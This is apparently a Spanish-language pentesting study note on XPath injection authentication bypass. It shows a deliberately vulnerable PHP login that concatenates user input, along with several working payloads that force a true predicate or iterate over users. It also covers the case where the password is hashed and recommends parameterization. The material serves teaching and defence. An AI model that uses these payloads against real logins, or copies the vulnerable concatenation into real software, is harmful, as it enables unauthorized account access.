---
tags:
  - Web/Red-Team
  - XPath
  - Pentesting/Explotacion
Fecha de actualización: 2026-07-16
Nota previa: "[[01 - Detección de XPath Injection]]"
Nota siguiente: "[[03 - Exfiltración de datos con XPath]]"
Area: "[[XPath Injection.base|XPath Injection]]"
---
---

El uso más directo de la XPath injection es el **bypass de autenticación**: cuando un login valida credenciales contra un documento XML, alterar el predicado permite <mark style="background: #FFB86CA6;">entrar sin conocer la contraseña —y a menudo sin conocer siquiera un usuario válido—</mark>. Es el análogo exacto del [[02 - Subvertir la lógica de consulta|bypass de login en SQLi]] con `' OR '1'='1`.

# La consulta de login vulnerable

Supongamos un `users.xml` con tres usuarios:

```xml
<users>
  <user><name first="Kaylie" last="Grenvile"/><username>kgrenvile</username><password>P@ssw0rd!</password></user>
  <user><name first="Admin" last="Admin"/><username>admin</username><password>admin</password></user>
  <user><name first="Academy" last="Student"/><username>htb-stdnt</username><password>Academy_student!</password></user>
</users>
```

La aplicación autentica con una consulta que empareja usuario y contraseña:

```xpath
/users/user[username/text()='htb-stdnt' and password/text()='Academy_student!']
```

Y el código PHP concatena la entrada sin sanitizar — el patrón vulnerable:

```php
$query = "/users/user[username/text()='" . $_POST['username'] . "' and password/text()='" . $_POST['password'] . "']";
```

# Bypass básico: `' or '1'='1`

Inyectando `' or '1'='1` en **ambos** campos, la consulta queda:

```xpath
/users/user[username/text()='' or '1'='1' and password/text()='' or '1'='1']
```

<mark style="background: #ADCCFFA6;">El predicado evalúa a `true` y la consulta devuelve **todos** los nodos `user`</mark>; la aplicación autentica con el primero de la lista (`kgrenvile`). Si conocemos un usuario concreto, lo apuntamos directamente:

```xpath
/users/user[username/text()='admin' or '1'='1' and password/text()='abc']
```

Aquí entramos como `admin` sin su contraseña.

> [!important]+ Por qué funciona: precedencia de operadores
> `and` liga más fuerte que `or`, así que el motor lee la primera consulta como `username='' or ('1'='1' and password='') or '1'='1'`. <mark style="background: #8000E1A6;">El último `or '1'='1'` es universalmente cierto</mark>, de modo que el predicado entero es `true` con independencia de usuario o contraseña. Entender esta precedencia es lo que permite construir el `payload` correcto cuando la estructura de la consulta varía.

# Escenario realista: contraseñas hasheadas

En producción la contraseña casi nunca se compara en claro. Si el código la hashea **antes** de insertarla en la consulta, el punto de inyección de la contraseña desaparece:

```php
$query = "/users/user[username/text()='" . $_POST['username'] . "' and password/text()='" . md5($_POST['password']) . "']";
```

Inyectar `' or '1'='1` en la contraseña ya no sirve — se convierte en un hash literal. <mark style="background: #FF5582A6;">Toda la inyección debe ir ahora por el campo `username`</mark>, y como tampoco conocemos un usuario válido, combinamos dos objetivos: forzar `true` e **iterar** hasta dar con el usuario que nos interesa.

- **`' or true() or '`** — un doble `or` que hace la consulta universalmente cierta y devuelve todos los usuarios:

```xpath
/users/user[username/text()='' or true() or '' and password/text()='<hash>']
```

- **`' or position()=2 or '`** — devuelve solo el segundo nodo `user`. Incrementando el índice iteramos usuario a usuario:

```xpath
/users/user[username/text()='' or position()=2 or '' and password/text()='<hash>']
```

- **`' or contains(.,'admin') or '`** — devuelve los `user` cuyos nodos descendientes contengan la cadena `admin` en cualquier campo. <mark style="background: #FFB86CA6;">Nos lleva directos a la cuenta administrativa aunque su `username` esté ofuscado</mark> (p. ej. `obfuscatedadminuser`):

```xpath
/users/user[username/text()='' or contains(.,'admin') or '' and password/text()='<hash>']
```

> [!warning]+ El hash de la contraseña no bloquea el ataque
> Hashear la contraseña antes de concatenar es una defensa **falsa**: cierra un punto de inyección pero deja el otro (`username`) abierto. La única mitigación real es parametrizar/escapar la entrada — ver [[08 - Prevención de XPath Injection]]. Un desarrollador que "arregló" el login hasheando sigue siendo vulnerable.

Con acceso conseguido, el siguiente objetivo suele ser leer el resto del documento XML: [[03 - Exfiltración de datos con XPath]].
